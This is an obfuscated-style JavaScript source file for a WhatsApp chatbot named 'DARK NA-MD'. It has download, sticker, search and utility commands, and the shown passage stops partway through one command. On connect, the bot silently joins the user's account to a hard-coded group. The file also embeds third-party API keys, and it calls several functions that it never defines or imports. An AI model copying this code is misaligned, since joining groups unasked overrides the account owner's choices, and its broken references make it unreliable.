 const {
  sms
} = require("./lib/message");
const {
  mediafire
} = require("./lib/mediafire.js");
const {
  fetchJson
} = require("./lib/myfunc.js");
const fs = require('fs');
const pino = require("pino");
const FileType = require('file-type');
const util = require("util");
const config = require("./config");
const axios = require('axios');
const {
  dbM
} = require('postgres_dbm');
const {
  MakeSession
} = require("./lib/session");
const l = console.log;
const {
  getBuffer,
  getGroupAdmins,
  getRandom,
  h2k,
  isUrl,
  Json,
  runtime,
  sleep
} = require("./lib/functions");
const {
  yt1s
} = require("./lib/ytdl");
const {
  searchApk,
  getApk
} = require("./lib/apk");
const {
  logjs
} = require("./lib/log");
if (!fs.existsSync('./media/session.json')) {
  MakeSession(config.SESSION_ID, "./media/session.json").then(console.log("Vesrion : " + require('./package.json').version));
}
const express = require("express");
const {
  createPublicKey
} = require('crypto');
const app = express();
const port = process.env.PORT || 0x1f40;
const owner = ['94766866297'];
async function connectToWA() {
  console.log("Syncing Database");
  const {
    state: _0x121a1d,
    saveState: _0x197886
  } = useSingleFileAuthState("./media/session.json", pino({
    'level': 'silent'
  }));
  const _0x1303d3 = makeWASocket({
    'logger': pino({
      'level': "silent"
    }),
    'auth': _0x121a1d,
    'printQRInTerminal': true,
    'browser': Browsers.macOS("Desktop"),
    'downloadHistory': false,
    'syncFullHistory': false
  });
  _0x1303d3.ev.on("connection.update", _0x35f8d8 => {
    const {
      connection: _0x163370,
      lastDisconnect: _0x167872
    } = _0x35f8d8;
    if (_0x163370 === "close") {
      if (_0x167872.error.output.statusCode !== DisconnectReason.loggedOut) {
        connectToWA();
      }
    } else {
      if (_0x163370 === "open") {
        logjs();
        const _0x5e1cbe = jidNormalizedUser(_0x1303d3.user.id);
        _0x1303d3.sendMessage(_0x5e1cbe, {
          'text': "*✅ DARK NA-MD SUCCESS CONNECT YOUR WHATSAPP*"
        });
        _0x1303d3.groupAcceptInvite("FfGKEgaNAg9CE10iPWUq75").then(_0x4552a2 => console.log("joined support group"))['catch'](_0x207e1b => console.log("Support Group Join Error !"));
      }
    }
  });
  _0x1303d3.ev.on("creds.update", _0x197886);
  _0x1303d3.ev.on("messages.upsert", async _0x49cb26 => {
    try {
      _0x49cb26 = _0x49cb26.messages[0x0];
      if (!_0x49cb26.message) {
        return;
      }
      _0x49cb26.message = getContentType(_0x49cb26.message) === 'ephemeralMessage' ? _0x49cb26.message.ephemeralMessage.message : _0x49cb26.message;
      if (_0x49cb26.key && _0x49cb26.key.remoteJid === "status@broadcast") {
        return;
      }
      const _0x44ab14 = getContentType(_0x49cb26.message);
      const _0x220339 = JSON.stringify(_0x49cb26.message);
      const _0x2ab1fb = _0x49cb26.key.remoteJid;
      const _0x1cb981 = _0x44ab14 == "extendedTextMessage" && _0x49cb26.message.extendedTextMessage.contextInfo != null ? _0x49cb26.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
      const _0x5a18c7 = _0x44ab14 === 'conversation' ? _0x49cb26.message.conversation : _0x44ab14 === "extendedTextMessage" ? _0x49cb26.message.extendedTextMessage.text : _0x44ab14 == "imageMessage" && _0x49cb26.message.imageMessage.caption ? _0x49cb26.message.imageMessage.caption : _0x44ab14 == "listResponseMessage" && _0x49cb26.message.listResponseMessage.singleSelectReply.selectedRowId ? _0x49cb26.message.listResponseMessage.singleSelectReply.selectedRowId : _0x44ab14 == "buttonsResponseMessage" && _0x49cb26.message.buttonsResponseMessage.selectedButtonId ? _0x49cb26.message.buttonsResponseMessage.selectedButtonId : _0x44ab14 == "templateButtonReplyMessage" && _0x49cb26.message.templateButtonReplyMessage.selectedId ? _0x49cb26.message.templateButtonReplyMessage.selectedId : _0x44ab14 == 'videoMessage' && _0x49cb26.message.videoMessage.caption ? _0x49cb26.message.videoMessage.caption : '';
      const _0x5eed09 = _0x5a18c7.startsWith('.');
      const _0x44ccdd = _0x5eed09 ? _0x5a18c7.slice('.'.length).trim().split(" ").shift().toLowerCase() : '';
      const _0x3d7650 = _0x5a18c7.trim().split(/ +/).slice(0x1);
      const _0x1b3106 = _0x3d7650.join(" ");
      const _0x26edd7 = _0x2ab1fb.endsWith("@g.us");
      const _0x312217 = _0x49cb26.key.fromMe ? _0x1303d3.user.id.split(':')[0x0] + "@s.whatsapp.net" || _0x1303d3.user.id : _0x49cb26.key.participant || _0x49cb26.key.remoteJid;
      const _0x5f08b8 = _0x312217.split('@')[0x0];
      const _0xbc5b9f = _0x1303d3.user.id.split(':')[0x0];
      const _0x4f7ded = _0x49cb26.pushName || "Sin Nombre";
      const _0x409df7 = _0xbc5b9f.includes(_0x5f08b8);
      const _0xde13b1 = owner.includes(_0x5f08b8) || _0x409df7;
      const _0x33e5d9 = _0x227dc8 => {
        _0x1303d3.sendMessage(_0x2ab1fb, {
          'text': _0x227dc8
        }, {
          'quoted': _0x49cb26
        });
      };
      const _0x52bf8c = _0x49cb26.isGroup ? await _0x1303d3.groupMetadata(_0x49cb26.chat)["catch"](_0x4733c2 => {}) : '';
      const _0x55304b = _0x49cb26.isGroup ? _0x52bf8c.subject : '';
      const _0x20d62b = _0x49cb26.isGroup ? await _0x52bf8c.participants : '';
      const _0x44bd10 = _0x49cb26.isGroup ? await _0x20d62b.filter(_0x3172a0 => _0x3172a0.admin !== null).map(_0x19bc5c => _0x19bc5c.id) : '';
      const _0x944389 = _0x49cb26.isGroup ? _0x52bf8c.owner : '';
      const _0x1a94c0 = _0x49cb26.isGroup ? _0x44bd10.includes(_0xbc5b9f) : false;
      const _0xbcab6a = _0x49cb26.isGroup ? _0x44bd10.includes(_0x49cb26.sender) : false;
      const {
        youtubedl: _0x5007f4,
        youtubedlv2: _0x27aeae,
        youtubedlv3: _0x26b2ec
      } = require("@bochilteam/scraper");
      if (!_0xde13b1 && _0x5a18c7.includes("chat.whatsapp.com")) {
        await _0x1303d3.sendMessage(_0x2ab1fb, {
          'delete': _0x49cb26.key
        });
      }
      if (_0x5eed09 && !_0x26edd7 && config.ONLY_GROUP == "true") {
        return _0x33e5d9(config.INBOX_BL_MSG);
      }
      if (_0x2ab1fb === "120363025246125888@g.us") {
        return;
      }
      if (_0x2ab1fb === "120363028440299317@g.us") {
        return;
      }
      if (_0x2ab1fb === "120363043598019970@g.us") {
        return;
      }
      _0x1303d3.sendImageAsSticker = async (_0x236e22, _0x2612e0, _0x9e7403, _0x587428 = {}) => {
        const {
          writeExifImg: _0x3b453c
        } = require("./lib/exif");
        let _0x2041df = Buffer.isBuffer(_0x2612e0) ? _0x2612e0 : /^data:.*?\/.*?;base64,/i.test(_0x2612e0) ? Buffer.from(_0x2612e0.split`,`[0x1], "base64") : /^https?:\/\//.test(_0x2612e0) ? await await getBuffer(_0x2612e0) : fs.existsSync(_0x2612e0) ? fs.readFileSync(_0x2612e0) : Buffer.alloc(0x0);
        let _0x2dd1e2;
        if (_0x587428 && (_0x587428.packname || _0x587428.author)) {
          _0x2dd1e2 = await _0x3b453c(_0x2041df, _0x587428);
        } else {
          _0x2dd1e2 = await imageToWebp(_0x2041df);
        }
        await XeonBotInc.sendMessage(_0x236e22, {
          'sticker': {
            'url': _0x2dd1e2
          },
          ..._0x587428
        }, {
          'quoted': _0x9e7403
        });
        return _0x2dd1e2;
      };
      _0x1303d3.downloadMediaMessage = async _0x222984 => {
        let _0x21778e = (_0x222984.msg || _0x222984).mimetype || '';
        let _0x589b4a = _0x222984.mtype ? _0x222984.mtype.replace(/Message/gi, '') : _0x21778e.split('/')[0x0];
        const _0x8b391f = await downloadContentFromMessage(_0x222984, _0x589b4a);
        let _0x1b84f7 = Buffer.from([]);
        for await (const _0x5aa2ed of _0x8b391f) {
          _0x1b84f7 = Buffer.concat([_0x1b84f7, _0x5aa2ed]);
        }
        return _0x1b84f7;
      };
      const _0x34cd92 = require("cheerio");
      async function _0x10312f(_0x17a4bd) {
        const _0x6eab2d = [];
        const _0x56ac05 = {
          'url': _0x17a4bd,
          'submit': ''
        };
        const {
          data: _0x30179a
        } = await axios("https://downloadgram.org/", {
          'method': "POST",
          'data': _0x56ac05
        });
        const _0x3957cf = _0x34cd92.load(_0x30179a);
        _0x3957cf("#downloadhere > a").each(function (_0xa1500d, _0x5d94fa) {
          const _0x7b0f28 = _0x3957cf(_0x5d94fa).attr("href");
          if (_0x7b0f28) {
            _0x6eab2d.push(_0x7b0f28);
          }
        });
        return _0x6eab2d;
      }
      async function _0x5e463c() {
        const _0x1fa4ad = [];
        const {
          data: _0x3bd9c4
        } = await axios.get("https://fmmods.com/download-center/mega.php");
        const _0x5dde95 = _0x34cd92.load(_0x3bd9c4);
        _0x5dde95("div.su-button-center").each(function (_0x25aae1, _0x285dd8) {
          const _0x27c645 = _0x5dde95(_0x285dd8).find('a').attr('href');
          const _0x5e20f8 = {
            'links': _0x27c645
          };
          _0x1fa4ad.push(_0x5e20f8);
        });
        console.log(_0x1fa4ad);
      }
      _0x1303d3.sendFileUrl = async (_0x16aaac, _0x1d0b63, _0x3cbd6a, _0x164161, _0x2affe8 = {}) => {
        let _0xc9328e = '';
        let _0xd6eaae = await axios.head(_0x1d0b63);
        _0xc9328e = _0xd6eaae.headers["content-type"];
        if (_0xc9328e.split('/')[0x1] === "gif") {
          return _0x1303d3.sendMessage(_0x16aaac, {
            'video': await getBuffer(_0x1d0b63),
            'caption': _0x3cbd6a,
            'gifPlayback': true,
            ..._0x2affe8
          }, {
            'quoted': _0x164161,
            ..._0x2affe8
          });
        }
        let _0x527b92 = _0xc9328e.split('/')[0x0] + "Message";
        if (_0xc9328e === "application/pdf") {
          return _0x1303d3.sendMessage(_0x16aaac, {
            'document': await getBuffer(_0x1d0b63),
            'mimetype': 'application/pdf',
            'caption': _0x3cbd6a,
            ..._0x2affe8
          }, {
            'quoted': _0x164161,
            ..._0x2affe8
          });
        }
        if (_0xc9328e.split('/')[0x0] === "image") {
          return _0x1303d3.sendMessage(_0x16aaac, {
            'image': await getBuffer(_0x1d0b63),
            'caption': _0x3cbd6a,
            ..._0x2affe8
          }, {
            'quoted': _0x164161,
            ..._0x2affe8
          });
        }
        if (_0xc9328e.split('/')[0x0] === "video") {
          return _0x1303d3.sendMessage(_0x16aaac, {
            'video': await getBuffer(_0x1d0b63),
            'caption': _0x3cbd6a,
            'mimetype': "video/mp4",
            ..._0x2affe8
          }, {
            'quoted': _0x164161,
            ..._0x2affe8
          });
        }
        if (_0xc9328e.split('/')[0x0] === "audio") {
          return _0x1303d3.sendMessage(_0x16aaac, {
            'audio': await getBuffer(_0x1d0b63),
            'caption': _0x3cbd6a,
            'mimetype': "audio/mpeg",
            ..._0x2affe8
          }, {
            'quoted': _0x164161,
            ..._0x2affe8
          });
        }
      };
      _0x1303d3.downloadAndSaveMediaMessage = async (_0x2a62cd, _0x2ce991, _0x16262d = true) => {
        let _0x3d453b = _0x2a62cd.msg ? _0x2a62cd.msg : _0x2a62cd;
        let _0x13099e = (_0x2a62cd.msg || _0x2a62cd).mimetype || '';
        let _0x30e365 = _0x2a62cd.mtype ? _0x2a62cd.mtype.replace(/Message/gi, '') : _0x13099e.split('/')[0x0];
        const _0x8275a5 = await downloadContentFromMessage(_0x3d453b, _0x30e365);
        let _0x3a6b29 = Buffer.from([]);
        for await (const _0x529906 of _0x8275a5) {
          _0x3a6b29 = Buffer.concat([_0x3a6b29, _0x529906]);
        }
        let _0x5e49e5 = await FileType.fromBuffer(_0x3a6b29);
        trueFileName = _0x16262d ? _0x2ce991 + '.' + _0x5e49e5.ext : _0x2ce991;
        await fs.writeFileSync('./lib/hi.jpeg', _0x3a6b29);
        return trueFileName;
      };
      switch (_0x44ccdd) {
        case 'menu':
        case 'panel':
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '🐋',
                'key': _0x49cb26.key
              }
            });
            let _0x5e9083 = "*Memory:* " + (process.memoryUsage().heapUsed / 0x400 / 0x400).toFixed(0x2) + "MB / " + Math.round(require('os').totalmem / 0x400 / 0x400) + "MB\n*Uptime:* " + runtime(process.uptime()) + "\n*Version:* " + require("./package.json").version + "\n\n*┌─✬ᴅᴏᴡɴʟᴏᴀᴅᴇʀ ᴄᴏᴍᴍᴀɴᴅꜱ✬*\n*│➠.song*\n*│➠.video*\n*│➠.fb*\n*│➠.mediafire*\n*│➠.gdrive*\n*│➠.img*\n*│➠.tiktok*\n*│➠.ig*\n*└─────────◉* \n*┌─✬ꜱᴇᴀʀᴄʜ ᴄᴏᴍᴍᴀɴᴅꜱ✬* \n*│➠.truecaller*\n*│➠.yts*\n*│➠.play*\n*│➠.npm*\n*│➠.lyrics*\n*└─────────◉* \n*┌─✬ᴄᴏɴᴠᴇʀᴛ ᴄᴏᴍᴍᴀɴᴅꜱ✬* \n*│➠.sticker*\n*│➠.readmore*\n*│➠.flip*\n*│➠.tinyurl*\n*│➠.emix*\n*│➠.attp*\n*│➠.ttp*\n*│➠.attp1*\n*│➠.attp2*\n*│➠.attp3*\n*│➠.attp*\n*│➠.logo*\n*│➠.ss*\n*│➠.ss2*\n*└─────────◉* \n*┌─✬ᴏᴛʜᴇʀ ᴄᴏᴍᴍᴀɴᴅꜱ✬* \n*│➠.alive*\n*│➠.update*\n*│➠.runtime*\n*│➠.ping*\n*│➠.clear*\n*└─────────◉*";
            const _0x14225e = [{
              'buttonId': ".ping ",
              'buttonText': {
                'displayText': "📟 Bot's Speed 📟"
              },
              'type': 0x1
            }, {
              'buttonId': ".sc ",
              'buttonText': {
                'displayText': "🐉 Bot's Script 🐉"
              },
              'type': 0x1
            }, {
              'buttonId': ".rate ",
              'buttonText': {
                'displayText': "🔰 Rate Us 🔰"
              },
              'type': 0x1
            }];
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': _0x5e9083,
              'buttons': _0x14225e,
              'headerType': 0x4
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case 'ping':
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '📟',
                'key': _0x49cb26.key
              }
            });
            var _0x76d027 = new Date().getTime();
            let _0xea1102 = await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "```Pinging To WaSocket.js!!!```"
            }, {
              'quoted': _0x49cb26
            });
            var _0x23473f = new Date().getTime();
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'delete': _0xea1102.key
            });
            return await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "*Pong*\n *" + (_0x23473f - _0x76d027) + " ms* "
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case 'alive':
          {
            if (!_0x1b3106) {
              return _0x33e5d9("*HI IM ALIVE NOW IM Nilambara*");
            }
            _0x33e5d9("*HELLO IM ALIVE NOW !*");
          }
          break;
        case "readmore":
          {
            if (!_0x1b3106) {
              return _0x33e5d9("*HI IM ALIVE NOW IM Nilambara*");
            }
            _0x33e5d9("​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​" + _0x1b3106);
          }
          break;
        case "npm":
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '📦',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("*Please give me package name.📦*");
            }
            axios.get("https://api.npms.io/v2/search?q=" + _0x1b3106).then(({
              data: _0x8e0c3a
            }) => {
              let _0x5f5785 = _0x8e0c3a.results.map(({
                package: _0x49bdb9
              }) => '*' + _0x49bdb9.name + "* (v" + _0x49bdb9.version + ")\n_" + _0x49bdb9.links.npm + "_\n_" + _0x49bdb9.description + '_').join("\n\n");
              _0x33e5d9(_0x5f5785);
            });
          }
          break;
        case "lyrics":
          try {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '✍️',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Example : .lyrics lelena");
            }
            const _0x5db8d5 = await fetchJson("https://api.sdbots.tk//lyrics?song=" + _0x1b3106);
            if (_0x5db8d5.lyrics == "undefin") {
              return _0x33e5d9("*Not Found !*");
            }
            const _0x4d5f2c = "*✍️ Artist :* " + _0x5db8d5.artist + "\n*Title :* " + _0x5db8d5.title + "\n\n" + _0x5db8d5.lyrics + "\n";
            _0x33e5d9(_0x4d5f2c);
          } catch (_0x361087) {
            _0x33e5d9("*Not Found !*");
          }
          break;
        case "save":
          {
            let _0x5a1ccb = require("@bochilteam/scraper");
            _0x5a1ccb.savefrom(_0x1b3106).then(async _0x351b65 => {
              _0x33e5d9(jsonformat(_0x351b65));
            });
          }
          break;
        case "flip":
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '♻️',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Example : .flip Back in black");
            }
            flipe = _0x1b3106.split('').reverse().join('');
            _0x33e5d9("*Given text :*\n" + _0x1b3106 + "\n*Fliped text :*\n" + flipe);
          }
          break;
        case 'git':
        case 'sc':
        case 'script':
        case "repo":
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': "🏷️",
                'key': _0x49cb26.key
              }
            });
            let {
              data: _0x43de1b
            } = await axios.get("https://api.github.com/repos/vihangayt0/Astro-MD-V6");
            let _0x4d7d91 = "*⭐ Total Stars:* _" + _0x43de1b.stargazers_count + " stars_\n*🍽️ Forks:* _" + _0x43de1b.forks_count + " forks_\n*🍁 Repo:* _github.com/acedemy/DARK-NA-V1_\n*💜 WHATSAPP-GROUP:* _chat.whatsapp.com/EGMrsAHsoK94SLTZWPww9d_\n";
            _0x33e5d9(_0x4d7d91);
          }
          break;
        case "tinyurl":
        case 'shorturl':
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': "🛡️",
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Provide me a link");
            }
            try {
              link = _0x1b3106.split(" ")[0x0];
              anu = await axios.get("https://tinyurl.com/api-create.php?url=" + link);
              _0x33e5d9("*🛡️Your Shortened URL*\n\n" + anu.data);
            } catch (_0x3d225d) {
              _0x33e5d9("*Error*");
            }
          }
          break;
        case "update":
        case "updatenow":
          {
            const _0x5e7b5f = jidNormalizedUser(_0x1303d3.user.id);
            if (!_0x409df7) {
              return _0x33e5d9("*Only For Owner !*");
            }
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '⬆️',
                'key': _0x49cb26.key
              }
            });
            let _0xeb6b82 = await redeploy();
            return _0x33e5d9(_0xeb6b82);
          }
          break;
        case 'memory':
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '🐠',
                'key': _0x49cb26.key
              }
            });
            const _0x36d175 = (process.memoryUsage().heapUsed / 0x400 / 0x400).toFixed(0x2) + "MB / " + Math.round(require('os').totalmem / 0x400 / 0x400) + 'MB';
            let _0x22213f = await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "```Getting Storage Status From Koyeb!!!```"
            }, {
              'quoted': _0x49cb26
            });
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'delete': _0x22213f.key
            });
            return await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': '*' + _0x36d175 + '*'
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case "runtime":
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '📟',
                'key': _0x49cb26.key
              }
            });
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': runtime(process.uptime())
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case 'clear':
          {
            if (!_0x409df7) {
              return _0x33e5d9("*Only For Owner !*");
            }
            await _0x1303d3.chatModify({
              'clear': {
                'messages': [{
                  'id': _0x2ab1fb,
                  'fromMe': true
                }]
              }
            }, _0x2ab1fb, []);
            return _0x33e5d9("_Chat cleared!_");
          }
          break;
        case 'clear1':
          {
            if (!_0x409df7) {
              return _0x33e5d9("*Only For Owner !*");
            }
            _0x1303d3.chatModify({
              'delete': true,
              'lastMessages': [{
                'key': _0x49cb26.key,
                'messageTimestamp': _0x49cb26.messageTimestamp
              }]
            }, _0x2ab1fb);
          }
          break;
        case "sek":
          {
            let {
              chat: _0x4e9e08,
              fromMe: _0xceb02a,
              id: _0x481d3b,
              isBaileys: _0x21b5fc,
              key: _0x169c68
            } = _0x1cb981;
            if (_0x21b5fc) {
              _0x33e5d9('bot');
            }
            if (!_0x21b5fc) {
              _0x33e5d9("no bot");
            }
          }
          break;
        case "btn":
          {
            _0x5e463c();
          }
          break;
        case 'gdrive':
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '📑',
                'key': _0x49cb26.key
              }
            });
            const _0x353452 = require('api-dylux');
            let _0x1cedcb = await _0x353452.GDriveDl(_0x1b3106);
            await _0x33e5d9("\n≡ *Google Drive DL*\n▢ *name:* " + _0x1cedcb.fileName + "\n▢ *size:* " + _0x1cedcb.fileSize + "\n▢ *type:* " + _0x1cedcb.mimetype);
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'document': {
                'url': _0x1cedcb.downloadUrl
              },
              'fileName': _0x1cedcb.fileName,
              'mimetype': _0x1cedcb.mimetype
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case "emix":
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '🔄',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Example : .emix 😅,🤔");
            }
            let [_0x1539c8, _0x14eef8] = _0x1b3106.split`,`;
            let _0x5e52bc = await fetchJson("https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=" + encodeURIComponent(_0x1539c8) + '_' + encodeURIComponent(_0x14eef8));
            const {
              Sticker: _0x2c8840,
              createSticker: _0x34e9b8,
              StickerTypes: _0x2e6a55
            } = require("wa-sticker-formatter");
            for (let _0x1ef43e of _0x5e52bc.results) {
              let _0x28ab56 = new _0x2c8840(_0x1ef43e.url, {
                'pack': _0x4f7ded,
                'author': '',
                'type': _0x1b3106.includes("--crop" || '-c') ? _0x2e6a55.CROPPED : _0x2e6a55.FULL,
                'categories': ['🤩', '🎉'],
                'id': '12345',
                'quality': 0x4b,
                'background': "transparent"
              });
              const _0x1ffd7a = await _0x28ab56.toBuffer();
              return _0x1303d3.sendMessage(_0x2ab1fb, {
                'sticker': _0x1ffd7a
              }, {
                'quoted': _0x49cb26
              });
            }
          }
          break;
        case "attp":
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '💠',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Example : .attp hello bro");
            }
            const {
              Sticker: _0x15d1be,
              createSticker: _0x2f42bf,
              StickerTypes: _0x5598da
            } = require('wa-sticker-formatter');
            let _0x3c421d = new _0x15d1be("https://api.lolhuman.xyz/api/attp?apikey=2e0da1f78d1721134b21816d&text=" + _0x1b3106, {
              'pack': _0x4f7ded,
              'author': '',
              'type': _0x1b3106.includes("--crop" || '-c') ? _0x5598da.CROPPED : _0x5598da.FULL,
              'categories': ['🤩', '🎉'],
              'id': "12345",
              'quality': 0x4b,
              'background': "transparent"
            });
            const _0x29f756 = await _0x3c421d.toBuffer();
            return _0x1303d3.sendMessage(_0x2ab1fb, {
              'sticker': _0x29f756
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case "attp1":
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '💠',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Example : .attp hello bro");
            }
            const {
              Sticker: _0x3ab685,
              createSticker: _0x492eb8,
              StickerTypes: _0x42102d
            } = require('wa-sticker-formatter');
            let _0x18234a = new _0x3ab685("https://api.akuari.my.id/other/ttp2?text=" + _0x1b3106, {
              'pack': _0x4f7ded,
              'author': '',
              'type': _0x1b3106.includes("--crop" || '-c') ? _0x42102d.CROPPED : _0x42102d.FULL,
              'categories': ['🤩', '🎉'],
              'id': "12345",
              'quality': 0x4b,
              'background': "transparent"
            });
            const _0x362802 = await _0x18234a.toBuffer();
            return _0x1303d3.sendMessage(_0x2ab1fb, {
              'sticker': _0x362802
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case "attp2":
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '💠',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Example : .attp hello bro");
            }
            const {
              Sticker: _0x21792c,
              createSticker: _0x5ea0f0,
              StickerTypes: _0x5937a1
            } = require("wa-sticker-formatter");
            let _0x415945 = new _0x21792c('https://api.lolhuman.xyz/api/attp2?apikey=2e0da1f78d1721134b21816d&text=' + _0x1b3106, {
              'pack': _0x4f7ded,
              'author': '',
              'type': _0x1b3106.includes('--crop' || '-c') ? _0x5937a1.CROPPED : _0x5937a1.FULL,
              'categories': ['🤩', '🎉'],
              'id': "12345",
              'quality': 0x4b,
              'background': "transparent"
            });
            const _0x47ea42 = await _0x415945.toBuffer();
            return _0x1303d3.sendMessage(_0x2ab1fb, {
              'sticker': _0x47ea42
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case "attp3":
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '💠',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Example : .attp hello bro");
            }
            const {
              Sticker: _0xa4c94e,
              createSticker: _0x5b1f63,
              StickerTypes: _0x48093e
            } = require("wa-sticker-formatter");
            let _0x4fdaf2 = new _0xa4c94e("https://api.lolhuman.xyz/api/ttp6?apikey=2e0da1f78d1721134b21816d&text=" + _0x1b3106, {
              'pack': _0x4f7ded,
              'author': '',
              'type': _0x1b3106.includes("--crop" || '-c') ? _0x48093e.CROPPED : _0x48093e.FULL,
              'categories': ['🤩', '🎉'],
              'id': "12345",
              'quality': 0x4b,
              'background': 'transparent'
            });
            const _0x3b4d4f = await _0x4fdaf2.toBuffer();
            return _0x1303d3.sendMessage(_0x2ab1fb, {
              'sticker': _0x3b4d4f
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case "ttp":
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '💠',
